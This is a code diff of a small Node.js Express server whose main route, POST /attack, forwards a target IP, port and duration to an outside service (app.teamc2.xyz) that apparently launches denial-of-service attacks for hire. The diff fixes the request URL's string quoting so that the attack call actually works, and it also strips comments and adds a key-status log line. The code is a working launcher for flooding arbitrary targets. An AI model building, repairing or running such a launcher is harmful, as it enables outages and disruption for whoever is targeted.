@@ -9,13 +9,11 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
-// 🔐 ENV
 const API_KEY = process.env.API_KEY;
-
-// ✅ PORT
 const PORT = process.env.PORT || 5000;
 
-// ✅ DEBUG (important)
+console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
+
 process.on("uncaughtException", (err) => {
   console.error("UNCAUGHT ERROR:", err);
 });
@@ -24,17 +22,14 @@ process.on("unhandledRejection", (err) => {
   console.error("UNHANDLED PROMISE:", err);
 });
 
-// ✅ ROOT (health check)
 app.get("/", (req, res) => {
   res.status(200).send("API Running 🚀");
 });
 
-// ✅ TEST ROUTE (extra debug)
 app.get("/test", (req, res) => {
   res.json({ msg: "Test OK" });
 });
 
-// ✅ MAIN API
 app.post("/attack", async (req, res) => {
   try {
     const { ip, port, time } = req.body;
@@ -47,7 +42,7 @@ app.post("/attack", async (req, res) => {
       return res.status(500).json({ error: "API key missing" });
     }
 
-    const url = 'https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1';
+    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;
 
     const response = await axios.get(url);
 
@@ -59,7 +54,6 @@ app.post("/attack", async (req, res) => {
   }
 });
 
-// ✅ LISTEN
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Server running on port ${PORT}`);
 });
